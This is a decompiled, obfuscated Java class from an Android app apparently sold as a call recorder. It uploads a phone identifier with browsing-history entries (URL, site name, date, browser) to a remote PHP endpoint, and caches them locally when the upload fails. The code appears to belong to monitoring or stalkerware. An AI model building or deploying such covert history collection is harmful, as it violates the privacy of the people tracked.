package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.b.a.a.a;
import a.c.b.K;
import a.c.b.m0;
import a.c.e.e;
import android.content.Context;
import com.crashlytics.android.Crashlytics;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SiteHistory */
public class l extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f245a;

    /* renamed from: b reason: collision with root package name */
    private final String f246b;

    /* renamed from: c reason: collision with root package name */
    private final String f247c;

    /* renamed from: d reason: collision with root package name */
    private final String f248d;

    /* renamed from: e reason: collision with root package name */
    private final String f249e;

    public l(Context context, String str, String str2, String str3, String str4) {
        this.f245a = context;
        this.f246b = str;
        this.f247c = str2;
        this.f248d = str3;
        this.f249e = str4;
    }

    public void run() {
        HashMap hashMap = new HashMap();
        StringBuilder a2 = a.a("");
        a2.append(e.e(this.f245a));
        hashMap.put("idPhone", a2.toString());
        hashMap.put("url", this.f246b);
        hashMap.put("nameSite", this.f247c);
        hashMap.put("dateUsed", this.f248d);
        hashMap.put("browser", this.f249e);
        try {
            if (!a.c.e.a.b("site/insertSiteHistory.php", (Map<String, String>) hashMap)) {
                String str = this.f246b;
                String str2 = this.f247c;
                String str3 = this.f248d;
                String str4 = this.f249e;
                try {
                    m0 m0Var = new m0(this.f245a);
                    K k = new K(str, str2, str3, str4);
                    m0Var.b();
                    m0Var.a(k);
                    m0Var.a();
                } catch (Exception unused) {
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            Crashlytics.logException(e2);
        }
    }
}
